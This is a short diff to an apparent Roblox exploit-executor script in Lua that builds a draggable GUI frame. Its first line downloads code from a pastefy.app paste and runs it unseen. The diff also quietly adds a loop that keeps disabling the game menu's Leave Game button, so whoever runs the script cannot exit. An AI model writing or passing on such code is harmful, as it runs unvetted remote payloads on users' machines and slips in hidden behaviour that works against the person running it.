@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("https://pastefy.app/gI1zmix6/raw"))()
+
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game:GetService("CoreGui")
 
@@ -12,6 +14,9 @@ frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
+
+task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)
+
 
 local frameUICorner = Instance.new("UICorner")
 frameUICorner.CornerRadius = UDim.new(0, 12)
